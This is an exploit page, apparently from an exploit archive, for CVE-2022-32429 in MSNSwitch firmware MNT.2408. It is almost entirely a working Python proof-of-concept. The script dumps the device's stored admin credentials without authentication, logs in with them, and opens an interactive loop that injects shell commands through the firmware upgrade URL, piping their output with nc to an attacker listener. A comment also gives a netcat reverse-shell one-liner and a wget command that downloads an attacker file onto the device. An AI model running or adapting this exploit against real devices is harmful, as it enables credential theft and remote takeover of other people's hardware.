	
<html><head><title>MSNSwitch Firmware MNT.2408 Remote Code Execution</TITLE><meta http-equiv="Content-Type" content="text/html; charset=utf-8"></HEAD><body><pre>Exploit Title: MSNSwitch Firmware MNT.2408 - Remote Code Exectuion (RCE)
Google Dork: n/a
Date:9/1/2022
Exploit Author: Eli Fulkerson
Vendor Homepage: https://www.msnswitch.com/
Version: MNT.2408
Tested on: MNT.2408 firmware
CVE: CVE-2022-32429

#!/usr/bin/python3


&quot;&quot;&quot;

POC for unauthenticated configuration dump, authenticated RCE on msnswitch firmware 2408.

Configuration dump only requires HTTP access.
Full RCE requires you to be on the same subnet as the device.

&quot;&quot;&quot; 

import requests
import sys
import urllib.parse
import readline
import random
import string


# listen with &quot;ncat -lk {LISTENER_PORT}&quot; on LISTENER_HOST
LISTENER_HOST = &quot;192.168.EDIT.ME&quot;
LISTENER_PORT = 3434

# target msnswitch
TARGET=&quot;192.168.EDIT.ME2&quot;
PORT=80

USERNAME = None
PASSWORD = None

&quot;&quot;&quot;
First vulnerability, unauthenticated configuration/credential dump
&quot;&quot;&quot;
if USERNAME == None or PASSWORD == None:
	# lets just ask
	hack_url=f&quot;http://{TARGET}:{PORT}/cgi-bin-hax/ExportSettings.sh&quot;
	session = requests.session()

	data = session.get(hack_url)
	for each in data.text.split(&#039;\n&#039;):
		key = None
		val = None

		try:
			key = each.strip().split(&#039;=&#039;)[0]
			val = each.strip().split(&#039;=&#039;)[1]
		except:
			pass

		if key == &quot;Account1&quot;:
			USERNAME = val
		if key == &quot;Password1&quot;:
			PASSWORD = val

&quot;&quot;&quot;
Second vulnerability, authenticated command execution

This only works on the local lan.

for full reverse shell, modify and upload netcat busybox shell script to /tmp:

	shell script: rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.X.X 4242 &gt;/tmp/f
	download to unit: /usr/bin/wget http://192.168.X.X:8000/myfile.txt -P /tmp

ref: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-busybox
&quot;&quot;&quot;

session = requests.session()

# initial login, establishes our Cookie
burp0_url = f&quot;http://{TARGET}:{PORT}/goform/login&quot;
burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Origin&quot;: f&quot;http://{TARGET}&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://192.168.120.17/login.asp&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.9&quot;, &quot;Connection&quot;: &quot;close&quot;}
burp0_data = {&quot;login&quot;: &quot;1&quot;, &quot;user&quot;: USERNAME, &quot;password&quot;: PASSWORD}
session.post(burp0_url, headers=burp0_headers, data=burp0_data)

# get our csrftoken
burp0_url = f&quot;http://{TARGET}:{PORT}/saveUpgrade.asp&quot;
data = session.get(burp0_url)

csrftoken = data.text.split(&quot;?csrftoken=&quot;)[1].split(&quot;\&quot;&quot;)[0]

while True:
	CMD = input(&#039;x:&#039;)
	CMD_u = urllib.parse.quote_plus(CMD)
	filename = &#039;&#039;.join(random.choice(string.ascii_letters) for _ in range(25))

	try:
		hack_url = f&quot;http://{TARGET}:{PORT}/cgi-bin/upgrade.cgi?firmware_url=http%3A%2F%2F192.168.2.1%60{CMD_u}%7Cnc%20{LISTENER_HOST}%20{LISTENER_PORT}%60%2F{filename}%3F&amp;csrftoken={csrftoken}&quot;

		session.get(hack_url, timeout=0.01)
	except requests.exceptions.ReadTimeout:
		pass

</PRE></BODY></HTML>